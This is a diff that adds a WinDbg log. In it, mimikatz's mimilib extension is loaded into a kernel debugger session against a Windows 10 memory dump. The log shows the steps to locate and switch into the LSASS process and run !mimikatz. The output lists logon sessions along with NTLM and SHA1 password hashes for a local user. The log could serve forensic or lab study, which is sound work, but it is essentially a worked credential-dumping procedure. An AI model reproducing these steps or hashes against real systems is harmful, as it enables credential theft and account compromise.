@@ -1,0 +1,250 @@
+
+************* Preparing the environment for Debugger Extensions Gallery repositories **************
+   ExtensionRepository : Implicit
+   UseExperimentalFeatureForNugetShare : true
+   AllowNugetExeUpdate : true
+   NonInteractiveNuget : true
+   AllowNugetMSCredentialProviderInstall : true
+   AllowParallelInitializationOfLocalRepositories : true
+
+   EnableRedirectToV8JsProvider : false
+
+   -- Configuring repositories
+      ----> Repository : LocalInstalled, Enabled: true
+      ----> Repository : UserExtensions, Enabled: true
+
+>>>>>>>>>>>>> Preparing the environment for Debugger Extensions Gallery repositories completed, duration 0.016 seconds
+
+************* Waiting for Debugger Extensions Gallery to Initialize **************
+
+>>>>>>>>>>>>> Waiting for Debugger Extensions Gallery to Initialize completed, duration 0.031 seconds
+   ----> Repository : UserExtensions, Enabled: true, Packages count: 0
+   ----> Repository : LocalInstalled, Enabled: true, Packages count: 29
+
+Microsoft (R) Windows Debugger Version 10.0.26100.1 AMD64
+Copyright (c) Microsoft Corporation. All rights reserved.
+
+
+Loading Dump File [C:\Users\Administrator\Downloads\memory.dmp]
+Kernel Complete Dump File: Full address space is available
+
+Symbol search path is: srv*
+Executable search path is: 
+Windows 10 Kernel Version 19041 MP (2 procs) Free x64
+Product: WinNt, suite: TerminalServer SingleUserTS
+Edition build lab: 19041.1.amd64fre.vb_release.191206-1406
+Kernel base = 0xfffff804`3b209000 PsLoadedModuleList = 0xfffff804`3be33290
+Debug session time: Tue May  7 11:00:16.090 2024 (UTC + 0:00)
+System Uptime: 0 days 0:00:27.720
+Loading Kernel Symbols
+...............................................................
+................................................................
+................................................
+Loading User Symbols
+
+Loading unloaded module list
+......
+
++------------------------------------------------------------------------+
+| This target supports Hardware-enforced Stack Protection. A HW based    |
+| "Shadow Stack" may be available to assist in debugging and analysis.   |
+| See aka.ms/userhsp for more info.                                      |
+|                                                                        |
+| dps @ssp                                                               |
+|                                                                        |
++------------------------------------------------------------------------+
+
+CS descriptor lookup failed
+For analysis of this file, run !analyze -v
+0: kd> .load C:\Users\Administrator\Downloads\mimikatz_trunk\x64\mimilib.dll
+
+  .#####.   mimikatz 2.2.0 (x64) built on Sep 19 2022 17:44:00
+ .## ^ ##.  "A La Vie, A L'Amour" - Windows build 19041
+ ## / \ ##  /* * *
+ ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ '## v ##'   https://blog.gentilkiwi.com/mimikatz             (oe.eo)
+  '#####'                                  WinDBG extension ! * * */
+
+===================================
+#         * Kernel mode *         #
+===================================
+# Search for LSASS process
+0: kd> !process 0 0 lsass.exe
+# Then switch to its context
+0: kd> .process /r /p <EPROCESS address>
+# And finally :
+0: kd> !mimikatz
+===================================
+#          * User mode *          #
+===================================
+0:000> !mimikatz
+===================================
+
+0: kd> !process 0 0 lsass.exe
+Unable to get program counter
+PROCESS ffffa3070f2d9080
+    SessionId: 0  Cid: 0288    Peb: 72c99e0000  ParentCid: 01e8
+    DirBase: 10537000  ObjectTable: ffffc607971ba3c0  HandleCount: 921.
+    Image: lsass.exe
+
+0: kd> .process /r /p ffffa3070f2d9080
+Implicit process is now ffffa307`0f2d9080
+Loading User Symbols
+................................................................
+........
+0: kd> !mimikatz
+Unable to get program counter
+Unable to load image \Windows\System32\TSpkg.dll, Win32 error 0n2
+*** WARNING: Unable to verify timestamp for TSpkg.dll
+Unable to load image \Windows\System32\wdigest.dll, Win32 error 0n2
+*** WARNING: Unable to verify timestamp for wdigest.dll
+Unable to load image \Windows\System32\dpapisrv.dll, Win32 error 0n2
+*** WARNING: Unable to verify timestamp for dpapisrv.dll
+
+SekurLSA
+========
+
+Authentication Id : 0 ; 99351 (00000000:00018417)
+Session           : Interactive from 1
+User Name         : jelly
+Domain            : DESKTOP-6RIU6GJ
+Logon Server      : DESKTOP-6RIU6GJ
+Logon Time        : 5/7/2024 10:59:54 AM
+SID               : S-1-5-21-4182252777-1766901480-2167484189-1001
+	msv : 
+	 [00000003] Primary
+	 * Username : jelly
+	 * Domain   : .
+	 * NTLM     : aa05ab5319d59779b937bdbf9797d895
+	 * SHA1     : e629d31dd80a280b5df262b3e11f6e931ff2dfda
+	kerberos : 
+	 * Username : jelly
+	 * Domain   : DESKTOP-6RIU6GJ
+	 * Password : (null)
+	ssp : 
+	credman : 
+
+Authentication Id : 0 ; 99256 (00000000:000183b8)
+Session           : Interactive from 1
+User Name         : jelly
+Domain            : DESKTOP-6RIU6GJ
+Logon Server      : DESKTOP-6RIU6GJ
+Logon Time        : 5/7/2024 10:59:54 AM
+SID               : S-1-5-21-4182252777-1766901480-2167484189-1001
+	msv : 
+	 [00000003] Primary
+	 * Username : jelly
+	 * Domain   : .
+	 * NTLM     : aa05ab5319d59779b937bdbf9797d895
+	 * SHA1     : e629d31dd80a280b5df262b3e11f6e931ff2dfda
+	kerberos : 
+	 * Username : jelly
+	 * Domain   : DESKTOP-6RIU6GJ
+	 * Password : (null)
+	ssp : 
+	credman : 
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : 
+Logon Time        : 5/7/2024 10:59:53 AM
+SID               : S-1-5-19
+	msv : 
+	kerberos : 
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	ssp : 
+	credman : 
+
+Authentication Id : 0 ; 72192 (00000000:00011a00)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : 
+Logon Time        : 5/7/2024 10:59:53 AM
+SID               : S-1-5-90-0-1
+	msv : 
+	kerberos : KO
+	ssp : 
+	credman : 
+
+Authentication Id : 0 ; 72152 (00000000:000119d8)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : 
+Logon Time        : 5/7/2024 10:59:53 AM
+SID               : S-1-5-90-0-1
+	msv : 
+	kerberos : KO
+	ssp : 
+	credman : 
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : DESKTOP-6RIU6GJ$
+Domain            : WORKGROUP
+Logon Server      : 
+Logon Time        : 5/7/2024 10:59:53 AM
+SID               : S-1-5-20
+	msv : 
+	kerberos : 
+	 * Username : desktop-6riu6gj$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	ssp : 
+	credman : 
+
+Authentication Id : 0 ; 49875 (00000000:0000c2d3)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : 
+Logon Time        : 5/7/2024 10:59:53 AM
+SID               : S-1-5-96-0-1
+	msv : 
+	kerberos : KO
+	ssp : 
+	credman : 
+
+Authentication Id : 0 ; 49836 (00000000:0000c2ac)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : 
+Logon Time        : 5/7/2024 10:59:53 AM
+SID               : S-1-5-96-0-0
+	msv : 
+	kerberos : KO
+	ssp : 
+	credman : 
+
+Authentication Id : 0 ; 48806 (00000000:0000bea6)
+Session           : UndefinedLogonType from 0
+User Name         : 
+Domain            : 
+Logon Server      : 
+Logon Time        : 5/7/2024 10:59:53 AM
+SID               : 
+	msv : 
+	kerberos : KO
+	ssp : 
+	credman : 
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : DESKTOP-6RIU6GJ$
+Domain            : WORKGROUP
+Logon Server      : 
+Logon Time        : 5/7/2024 10:59:53 AM
+SID               : S-1-5-18
+	msv : 
+	kerberos : 
+	 * Username : desktop-6riu6gj$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	ssp : 
+	credman : 
